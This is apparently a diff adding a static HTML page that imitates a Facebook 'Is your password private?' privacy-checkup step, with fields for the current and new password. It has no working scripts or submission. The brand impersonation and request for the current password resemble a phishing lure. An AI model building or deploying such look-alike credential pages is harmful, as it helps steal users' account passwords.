@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="./Image/icon.png" />
+    <link rel="stylesheet" href="Css/body.css">
+    <link rel="stylesheet" href="Css/Privacy2.css">
+</head>
+
+<body>
+    <div class="step-container">
+        <div class="multi-step-form">
+            <div class="step active">
+                <div class="mobile_header">
+                    <button class="back_header" onClick="">
+                        <i class="icon-back"></i>
+                    </button>
+                    <div class="title_header">
+                        <span>Password</span>
+                    </div>
+                    <div class="back_header"></div>
+                </div>
+                <div class="title2">
+                    <div class="icon-wrapper">
+                        <button class="event_back_step" onClick="">
+                            <i class="icon-back"></i>
+                        </button>
+                    </div>
+                    <span>Is your password private?</span>
+                </div>
+                <hr />
+                <div class="text-info">
+                    <h2>Is your password private?</h2>
+                    <p>
+                        If your Facebook password is used eisewhere
+                        online then your account may be less secure.
+                        Protect yourself and your Facebook friends by
+                        choosing a stronger password.
+                    </p>
+                </div>
+
+                <!--For mobile <div class="tip_password_container block"> -->
+                <div class="tip_password_container">
+                    <div class="tip_password_wrapper">
+                        <div class="icon_tip">
+                            <i class="light"></i>
+                            <span>Password tips</span>
+                        </div>
+                        <div class="tip_text_wrapper">
+                            <div class="tip_text_item">
+                                <span>•</span>
+                                <p>
+                                    Choose a password that you don't use
+                                    anywhere else online.
+                                </p>
+                            </div>
+                            <div class="tip_text_item">
+                                <span>•</span>
+                                <p>
+                                    Make it easy for you to remember and
+                                    difficult for others to guess.
+                                </p>
+                            </div>
+                            <div class="tip_text_item">
+                                <span>•</span>
+                                <p>
+                                    Never share your password with
+                                    anyone.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="contact_form_container">
+                    <div class="form_contact_password">
+                        <div class="form_contact_item">
+                            <svg class="form_item_icon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24">
+                                <path fill="currentColor"
+                                    d="m12 1l8.217 1.826a1 1 0 0 1 .783.976v9.987a6 6 0 0 1-2.672 4.992L12 23l-6.328-4.219A6 6 0 0 1 3 13.79V3.802a1 1 0 0 1 .783-.976zm0 2.049L5 4.604v9.185a4 4 0 0 0 1.781 3.328L12 20.597l5.219-3.48A4 4 0 0 0 19 13.79V4.604zM12 7a2 2 0 0 1 1.001 3.732L13 15h-2v-4.268A2 2 0 0 1 12 7" />
+                            </svg>
+                            <input type="password" name="currentPassword" value="" placeholder="Current password"
+                                onChange="" />
+                        </div>
+                        <p class="isValid">
+                        </p>
+
+                        <div class="form_contact_item">
+                            <svg class="form_item_icon" style="transform: rotate(180deg)"
+                                xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-key-round">
+                                <path
+                                    d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z" />
+                                <circle cx="16.5" cy="7.5" r=".5" fill="currentColor" />
+                            </svg>
+                            <input type="password" name="newPassword" value="" placeholder="New password" onChange="" />
+                        </div>
+                        <p class="isValid">
+                        </p>
+                        <div class="form_contact_item">
+                            <svg class="form_item_icon" style="transform: rotate(180deg)"
+                                xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-key-round">
+                                <path
+                                    d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z" />
+                                <circle cx="16.5" cy="7.5" r=".5" fill="currentColor" />
+                            </svg>
+                            <input type="password" name="re_newPassword" value=""
+                                placeholder="Re-type new password" onChange="" />
+                        </div>
+                        <p class="isValid">
+                        </p>
+                    </div>
+                </div>
+                <div class="change_password">
+                    <!-- Is Loading button -->
+                    <!-- <button
+                        onClick=""
+                        class="button_change_password loading-button"
+                        disabled
+                    >
+                        <div class="spinner"></div>
+                        <span
+                            class="button-text loading"
+                        >
+                            Save changes
+                        </span>
+
+                    </button> -->
+                     <!-- Active button -->
+                    <button
+                        onClick=""
+                        class="button_change_password"
+                    >
+                        <span
+                            class="button-text"
+                        >
+                            Save changes
+                        </span>
+
+                    </button>
+                </div>
+
+                <div class="forgot_password">
+                    <a class="button_forgot_password">
+                        <span>Forgot your password?</span>
+                    </a>
+                </div>
+
+                <div class="progressBar">
+                    <div
+                        style="width: 25%"
+                        class="progress"
+                    ></div>
+                </div>
+                <div class="event_button_container">
+                    <div class="event_button_wrapper">
+                        <div class="progressBar_mobile">
+                            <div class="dot_mobile active"> </div>
+                            <div class="dot_mobile "> </div>
+                            <div class="dot_mobile "> </div>
+                            <div class="dot_mobile "> </div>
+                        </div>
+                        <button class="event_back" onClick="">
+                            Back
+                        </button>
+                        <button class="event_continue" onClick="">
+                            Skip
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
